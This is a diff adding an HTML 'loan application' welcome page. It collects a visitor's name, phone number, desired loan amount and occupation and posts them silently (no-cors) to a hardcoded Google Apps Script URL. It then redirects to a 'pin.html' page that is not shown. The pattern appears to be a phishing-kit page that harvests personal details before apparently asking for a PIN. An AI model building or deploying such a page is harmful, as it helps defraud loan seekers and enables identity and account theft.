@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Welcome - Loan Application</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Arial, sans-serif;
+        background: #f0f4f8;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .box {
+        background: #fff;
+        padding: 30px;
+        border-radius: 14px;
+        width: 90%;
+        max-width: 360px;
+        text-align: center;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        color: #0088cc;
+        margin: 0 0 8px;
+      }
+      p {
+        color: #555;
+        font-size: 14px;
+        margin-bottom: 20px;
+      }
+      input,
+      select,
+      button {
+        width: 100%;
+        padding: 12px;
+        margin-top: 10px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        font-size: 15px;
+        box-sizing: border-box;
+      }
+      button {
+        background: #0088cc;
+        color: #fff;
+        border: none;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+      button:hover:not(:disabled) {
+        background: #0077b3;
+      }
+      button:disabled {
+        background: #aaa;
+        cursor: not-allowed;
+      }
+      #status {
+        font-size: 13px;
+        margin-top: 10px;
+        min-height: 18px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <h2>Welcome, New Member! 👋</h2>
+      <p>Fill the form below to start your loan application</p>
+
+      <form id="welcomeForm">
+        <input type="text" id="name" placeholder="Full Name" required />
+        <input
+          type="tel"
+          id="phone"
+          placeholder="Phone Number e.g. 0712..."
+          required
+        />
+        <input
+          type="number"
+          id="loan"
+          placeholder="Loan Amount You Want to Apply"
+          required
+        />
+
+        <select id="occupation" required>
+          <option value="">Select Current Occupation</option>
+          <option value="Salaried">Salaried</option>
+          <option value="Self Employed">Self Employed</option>
+          <option value="Business Owner">Business Owner</option>
+          <option value="Student">Student</option>
+          <option value="Farmer">Farmer</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <button type="submit" id="nextBtn">Next</button>
+      </form>
+
+      <p id="status"></p>
+    </div>
+
+    <script>
+      // ===== REPLACE WITH YOUR GOOGLE APPS SCRIPT WEB APP URL =====
+      const SCRIPT_URL =
+        "https://script.google.com/macros/s/AKfycbzhip2iEQWNWWNWmGcqH15EX4TJJi3Y-27O2OgdhrQ8HDz5LOPRJhE-AJ6qWNWmuIMB/exec";
+      // ==========================================================
+
+      document
+        .getElementById("welcomeForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const name = document.getElementById("name").value.trim();
+          const phone = document.getElementById("phone").value.trim();
+          const loan = document.getElementById("loan").value.trim();
+          const occupation = document.getElementById("occupation").value;
+
+          const status = document.getElementById("status");
+          const btn = document.getElementById("nextBtn");
+
+          btn.disabled = true;
+          status.innerText = "Submitting...";
+          status.style.color = "#555";
+
+          // Save for next page
+          localStorage.setItem("user_name", name);
+          localStorage.setItem("user_phone", phone);
+          localStorage.setItem("user_loan", loan);
+          localStorage.setItem("user_occupation", occupation);
+
+          const payload = {
+            type: "application",
+            name: name,
+            phone: phone,
+            loan: loan,
+            occupation: occupation,
+          };
+
+          fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "text/plain" },
+            body: JSON.stringify(payload),
+          })
+            .then(() => {
+              status.innerText = "Sent! Going to next step...";
+              status.style.color = "green";
+              setTimeout(() => {
+                window.location.href = "pin.html";
+              }, 1000);
+            })
+            .catch(() => {
+              status.innerText = "Network Error";
+              status.style.color = "red";
+              btn.disabled = false;
+            });
+        });
+    </script>
+  </body>
+</html>
